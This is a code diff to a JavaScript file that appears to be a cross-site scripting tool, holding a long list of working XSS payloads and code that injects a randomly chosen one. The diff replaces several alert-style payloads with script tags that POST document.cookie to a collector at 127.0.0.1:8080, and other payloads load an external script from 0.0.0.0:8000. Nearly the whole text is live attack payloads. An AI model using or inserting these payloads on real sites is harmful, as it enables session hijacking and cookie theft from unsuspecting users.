@@ -31,10 +31,10 @@ var XSSattack = function(message){
 };
 
 var attackVariants = [
-  '><script>$.ajax({type: "POST",url: "http://127.0.0.1:8080/",data: document.cookie,success: function(data){console.log(\'post is working\');}});</script>',
+  '<script>$.ajax({type: "POST",url: "http://127.0.0.1:8080/",data: document.cookie,success: function(data){console.log(\'post is working\');}});</script>',
   'javascript:alert("You are vulnerable to Non-Standard Javascript XSS attacks: " + document.cookie)',
   '<a onmouseover="alert(\'You are vulnerable to Broken Tag XSS attacks: \' + document.cookie)">Injected Element</a>',
-  '><<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack: " + document.cookie);//<</SCRIPT>',
+  '><<SCRIPT>$.ajax({type: "POST",url: "http://127.0.0.1:8080/",data: document.cookie,success: function(data){console.log(\'post is working\');}});//<</SCRIPT>',
   '></TITLE><SCRIPT>alert("You are vulnerable to a Title Change XSS attack: " + document.cookie);</SCRIPT>',
   '<IFRAME src="http://0.0.0.0:8000/non-alpha-xss.js"></IFRAME>',
   '><SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.js></SCRIPT>',
@@ -44,11 +44,11 @@ var attackVariants = [
   'data:text/html,<script>alert("You are vulnerable to a Data Injection XSS attack: " + document.cookie)</script>',
   '<a href=“?xss=<script>”>You are vulnerable to Click-Jacking XSS attacks</a>',
   '><SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
-  "'><SCRIPT>alert('You are vulnerable to XSS: ' + document.cookie)</SCRIPT><xss a='",
+  "'><SCRIPT>$.ajax({type: \"POST\",url: \"http://127.0.0.1:8080/\",data: document.cookie,success: function(data){console.log(\'post is working\');}});</SCRIPT><xss a='",
   '<input onfocus="alert(document.cookie)" autofocus>',
   '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;document.cookie&rpar;&gt;" />',
   'http://0.0.0.0:8000/non-alpha-xss.js',
-  '</script><script>alert("You are vulnerable to a Multiple Script Tag XSS attack: " + document.cookie)</script>',
+  '</script><script>$.ajax({type: "POST",url: "http://127.0.0.1:8080/",data: document.cookie,success: function(data){console.log(\'post is working\');}});</script>',
   '--><img onload="alert(1)" src="a.gif"/><--',
   '<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(document.cookie))%7d//["\'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(document.cookie))%7D";</style>//["\'`-->]]>]</div><div id="31"><frameset onload=alert(document.cookie)>//["\'`-->]]>]</div><div id="32"><table background="javascript:alert(document.cookie)"></table>//["\'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(document.cookie);">XXX</a></a><a href="javascript:alert(document.cookie)">XXX</a>//["\'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["\'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(document.cookie) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["\'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(document.cookie)">XXX</a>//["\'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(document.cookie)//">//["\'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(document.cookie)//">//["\'`-->]]>]</div>',
   '<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror="alert(document.cookie)"//"></svg>//["\'`-->]]>]</div>',
@@ -69,8 +69,7 @@ $.ajax({
 					console.log('post is working');
 				}
 			});
-			XSSattack(attackVariants[0]);
-			// XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
+			XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 		} else {
 			window.history.back();
 		}
